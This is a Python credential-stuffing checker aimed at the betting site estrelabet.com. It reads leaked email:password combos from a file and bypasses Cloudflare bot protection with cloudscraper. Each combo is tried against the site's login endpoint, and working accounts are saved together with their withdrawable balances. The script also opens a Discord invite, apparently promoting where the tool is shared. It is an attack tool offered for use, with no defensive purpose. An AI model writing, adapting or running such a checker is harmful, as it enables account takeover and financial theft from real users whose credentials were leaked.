import cloudscraper
import requests
import os
import webbrowser
import time
import json

webbrowser.open("https://discord.gg/ZHyM4ZmRqB")

if not os.path.exists('Results'):
    os.makedirs('Results')

def check_login(login, password):
    login_url = 'https://service.estrelabet.com/ajax/login'
    profile_url = 'https://service.estrelabet.com/ajax/profile/getData'
    
    scraper = cloudscraper.create_scraper()
    session = requests.Session()

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Referer": "https://www.estrelabet.com/",
        "Origin": "https://www.estrelabet.com",
        "Accept-Language": "pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    payload = {
        "emailId": login,
        "password": password
    }

    response = scraper.post(login_url, headers=headers, data=payload)

    if "The account and password you entered don" in response.text:
        with open('Results/Invalid.txt', 'a', encoding='utf-8') as f:
            f.write(f'{login}:{password} - Response.text: {response.text}\n')
        print(f'Conta inválida: {login}:{password}')
    else:
        profile_response = scraper.get(profile_url, headers=headers)

        try:
            profile_data = profile_response.json()
            withdrawable_balance = profile_data['balanceDetails']['withdrawableBalance']

            with open('Results/Validas.txt', 'a', encoding='utf-8') as f:
                f.write(f'Conta Válida: {login}:{password} | Saldo: {withdrawable_balance}\n')
            print(f'Conta Válida: {login}:{password} | Saldo: {withdrawable_balance}')
        except (ValueError, KeyError) as e:
            pass

def main():
    with open('combo.txt', 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if line:
                try:
                    login, password = line.split(':')
                    check_login(login, password)
                except ValueError:
                    print(f'Formato inválido na linha: {line}')

if __name__ == '__main__':
    main()